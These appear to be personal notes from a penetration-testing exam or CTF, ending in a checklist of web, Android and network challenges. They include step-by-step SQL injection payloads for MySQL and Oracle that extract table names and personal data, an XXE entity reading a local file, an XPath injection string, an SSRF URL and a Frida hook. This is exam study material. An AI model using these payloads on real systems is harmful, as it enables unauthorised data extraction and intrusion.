Java.perform(function(){
    var MainActivity = Java.use('com.netsquare.enigmaexam.MainActivity');

    MainActivity.On_click = function(){
        send('')
    };
})


For c23 use demo.jsp:.txt

http://192.168.2.243:8080/secret.txt
Ssrf
C19 wval parameter/Base64 



Step1

' Union all SeLect table_name,NULL,NULL FrOm information_schema.tables--

Step2

' Union all SeLect Concat(table_name),NULL,NULL FrOm information_schema.tables--

Step3

' Union all SeLect Concat(column_name),NULL,NULL FrOm information_schema.columns Where table_name='net_square'--

Step4

' Union all Select Concat(name,phone_number),NULL,NULL From net_square-- -





Step-1

' Union Select null,Table_name,null From all_Tables--

Step-2

' Union Select null,Column_name,null From all_tab_columns Where Table_name='NET_SQUARE'--

Step-3

' Union Select null,NAME||PHONE_NUMBER,null From NET_SQUARE--


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY var SYSTEM "file:///etc/hash.txt">]>
<data><col>TG9jYXRpb24=</col><wval>2010</wval></data>



XPATH query : //emp[user/text()='Ravi' and pass/text()='Elon@123']/key--



Web Challenges		
C1 <=> Observation of Encrypted/Hashed/Encoded String		done
C2 <=> Web Time Traveller		                done
C3 <=> User Login Bypass 		                done
C4 <=> Server Fingerprinting		            done
C5 <=> HTTP Form Manipulation		            done
C6 <=> Client Side Input Validation Bypass		done
C7 <=> User ID Enumeration		                done
C8 <=> 2FA Bypass Using Brute Force Attack		done
C9 <=> HTML5 Storage		                    done
C10 <=> Session Validation Bypass		        done
C11 <=> XSS via Weak Client Side Validation		done
C12 <=> XSS via WAF Bypass		                pending
C13 <=> Weak Session ID		                    done
C14 <=> Insecure Direct Object Reference		done
C15 <=> REST API HTTP Methods		            done
C16 <=> Brute force on CSRF enabled Page		pending
C17 <=> Server-side request forgery		done
C18 <=> NoSQL Injection		            pending
C19 <=> SQL Injection via WAF Bypass		done
C20 <=> Advanced SQL Injection		        pending
C21 <=> Exploiting XXE to Retrieve File		pending
C22 <=> Exploiting XXE Vulnerabilities In File Parsing Functionality		pending
C23 <=> Unrestricted File Upload		    done
C24 <=> PHP Code Injection using RFI		pending
C25 <=> Exploitation of Deserialization		pending
C26 <=> Passive Information Collection		done
C27 <=> XPATH Injection		                pending

Mobile Android Challenges		
C28 <=> Hard Coded Secrets in Application 1		done
C29 <=> Hard Coded Secrets in Application 2		done
C30 <=> Root Detection and SSL Pinning Bypass		done
C31 <=> Improper Export of Android Application Components		done
C32 <=> 2FA Bypass Android		done

Mobile iOS Challenges		
C33 <=> Hard Coded Secrets in Application 3		pending

Network Challenges		
C34 <=> Network Traffic Analysis & Reproduce Attack		done
C35 <=> Insecure Cloud Storage		pending
C36 <=> Boot2Root Challenge		done

Code Review Challenges